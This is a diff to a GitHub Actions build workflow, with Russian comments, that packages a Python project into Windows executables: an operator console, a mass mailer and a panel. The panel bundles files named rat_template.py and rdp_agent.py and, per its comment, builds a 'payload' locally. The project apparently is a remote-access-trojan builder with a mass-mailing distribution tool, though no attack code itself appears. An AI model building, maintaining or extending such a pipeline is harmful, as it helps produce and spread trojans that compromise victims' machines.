@@ -1,5 +1,5 @@
 # language: YAML, file: .github/workflows/build.yml
-# *сборка operator.exe и mass_mail.exe; payload собирается локально через panel.py*
+# *собирает operator.exe, mass_mail.exe, panel.exe; payload — локально через панель*
 name: build
 
 on:
@@ -23,32 +23,16 @@ jobs:
           pip install -r requirements.txt
 
       - name: Syntax check
-        run: |
-          python -m py_compile builder.py rat_template.py rdp_agent.py rdp_operator.py mass_mail.py panel.py
+        run: python -m py_compile builder.py rat_template.py rdp_agent.py rdp_operator.py mass_mail.py panel.py
 
       - name: Build operator
-        run: |
-          pyinstaller --onefile --noconsole --name operator ^
-            --hidden-import=PyQt5.QtCore ^
-            --hidden-import=PyQt5.QtGui ^
-            --hidden-import=PyQt5.QtWidgets ^
-            rdp_operator.py
+        run: pyinstaller --onefile --noconsole --name operator --hidden-import=PyQt5.QtCore --hidden-import=PyQt5.QtGui --hidden-import=PyQt5.QtWidgets rdp_operator.py
 
       - name: Build mass_mail
-        run: |
-          pyinstaller --onefile --noconsole --name mass_mail mass_mail.py
+        run: pyinstaller --onefile --noconsole --name mass_mail mass_mail.py
 
       - name: Build panel
-        run: |
-          pyinstaller --onefile --noconsole --name panel ^
-            --hidden-import=PyQt5.QtCore ^
-            --hidden-import=PyQt5.QtGui ^
-            --hidden-import=PyQt5.QtWidgets ^
-            --add-data "rat_template.py;." ^
-            --add-data "rdp_agent.py;." ^
-            --add-data "rdp_operator.py;." ^
-            --add-data "mass_mail.py;." ^
-            panel.py
+        run: pyinstaller --onefile --noconsole --name panel --hidden-import=PyQt5.QtCore --hidden-import=PyQt5.QtGui --hidden-import=PyQt5.QtWidgets --add-data "rat_template.py;." --add-data "rdp_agent.py;." --add-data "rdp_operator.py;." --add-data "mass_mail.py;." panel.py
 
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
